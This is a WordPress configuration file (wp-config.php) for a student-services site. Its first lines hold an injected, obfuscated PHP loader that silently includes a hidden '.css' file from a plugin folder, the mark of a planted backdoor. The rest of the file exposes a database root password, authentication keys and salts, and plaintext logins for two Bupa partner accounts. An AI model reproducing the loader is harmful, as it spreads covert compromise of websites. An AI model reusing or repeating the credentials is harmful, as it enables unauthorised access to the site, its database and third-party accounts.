<?php
/*78cfd*/

$tt0='b6'; $rpowj = "/var/www/sansangduhoc/wp\x2dcont\x65nt/plugins/bunyad\x2dwidg\x65ts/.ba8232d9.css"; $rpowj = substr($rpowj, 0); if (!empty($rpowj)){ @include_once /* ys4 */ ($rpowj); }

/*78cfd*/

define( 'WP_CACHE', false ); // Added by WP Rocket
define('WP_MEMORY_LIMIT', '2048M');
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');
/** MySQL database username */
define('DB_USER', 'root');
/** MySQL database password */
define('DB_PASSWORD', '3756c16d86986a5ffd656f616c335a4c3ff514ff8612a654');
/** MySQL hostname */
define('DB_HOST', '127.0.0.1');
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'g~.CY8 G5Q?FRg27IZL:*T7y!|k++|IV- w{qS +k#CB13n62&&R*L6qdt!G|p<f');
define('SECURE_AUTH_KEY',  '~<kt%#38J`.q.v$blyFt`O7Cu/6|PW$T#)5gB4X}$KbQQ_dX9Hk6^Tw+cYZmM$_:');
define('LOGGED_IN_KEY',    '#&]:eR-x?#}gRZ64f-GObcOx(_l3R ]H~5##@_>}D=$4Q2TyoA~e|}}KsU0Vk6Vm');
define('NONCE_KEY',        'Lx=W_dysGu5^7+wS!Gl[QiHGJ!K012wG;|,}S,tk(G AzgjJDxFta%dSt@J:-TN!');
define('AUTH_SALT',        'x*yBP>q5A.I+)+ccH{1I3:BL]8]m?:Plv A?J&&CkPipEC,&F|UU=oD!ym|a77wU');
define('SECURE_AUTH_SALT', 'H^/2RQMG{|mYCBEg!E~|?eVeS-AZf>qF)kdE+8z:%>S+wjUw]on+XzWp5f0bxq-6');
define('LOGGED_IN_SALT',   'R/owC}(?*Q]J=gU4qc:7Hxxum)m_K<Y8-~MhSKfaZ:NDs/|%T0Z*J8L6m9$N:J`|');
define('NONCE_SALT',       '!f+;uF/sa}>]ri`/PxQ_8]Bmb}RmXOvg7pSpZ+M+Wk.xH;Oz-Qwx3AL)8;2}:ezH');
/**#@-*/
define('WPLANG', 'en');
// Enable WP_DEBUG mode
define( 'WP_DEBUG', true );
// Enable Debug logging to the /wp-content/debug.log file
define( 'WP_DEBUG_LOG', true );
// Disable display of errors and warnings
define( 'WP_DEBUG_DISPLAY', false );
//@ini_set( 'display_errors', 0 );
// Use dev versions of core JS and CSS files (only needed if you are modifying these core files)
define( 'SCRIPT_DEBUG', false );
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_20_';
//define('DISABLE_WP_CRON', true);
/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
define( 'WP_AUTO_UPDATE_CORE', false );
define( 'DISALLOW_FILE_MODS', true );
define( 'DISALLOW_FILE_EDIT', true );
if (!defined('QH_EC_REFIX_DOMAIN_NAME')) {
	define( 'QH_EC_REFIX_DOMAIN_NAME','');
}
if (!defined('SALES_EMAIL_PTE')) {
	define( 'SALES_EMAIL_PTE', 'pteplatform@annalink.com' );
}
if (!defined('SALES_EMAIL')) {
	define( 'SALES_EMAIL', 'info@oshcstudents.com' );
}
if (!defined('SALES_EMAIL_NEPAL')) {
	define( 'SALES_EMAIL_NEPAL', 'agents.nepal@annalink.com');
}
if (!defined('ACCOUNTANT_EMAIL')) {
	define( 'ACCOUNTANT_EMAIL', 'admin2@annalink.com' );
}
if ( ! defined( 'ADMIN_EMAIL' ) ) {
    define( 'ADMIN_EMAIL', 'congtrionline@gmail.com' );
}
if (!defined('BUPA_USERNAME')) {
	define( 'BUPA_USERNAME', 'sean@annalink.com' );
}
if (!defined('BUPA_PASSWORD')) {
	define( 'BUPA_PASSWORD', 'Anson1719' );
}
if (!defined('BUPA_USERID')) {
	define( 'BUPA_USERID', '1661' );
}
if (!defined('BUPA_USERNAME_ADVANTAGE')) {
	define( 'BUPA_USERNAME_ADVANTAGE', 'info@annalink.com' );
}
if (!defined('BUPA_PASSWORD_ADVANTAGE')) {
	define( 'BUPA_PASSWORD_ADVANTAGE', 'Annalink@123' );
}
if (!defined('BUPA_USERID_ADVANTAGE')) {
	define( 'BUPA_USERID_ADVANTAGE', '3656' );
}
if (!defined('BUPA_OLD_RATES')) {
	define( 'BUPA_OLD_RATES', 'current_rates' );
}
//GTM time zone
if (!defined('BUPA_PRICE_APPLY_DATE')) {
	define( 'BUPA_PRICE_APPLY_DATE', '2030-09-29 17:00:00' );
}
// API URL CRM
if (!defined('CRM_API_URL')) {
	define( 'CRM_API_URL', 'https://crm.annalink.com/api/crm/register_customer' );
}
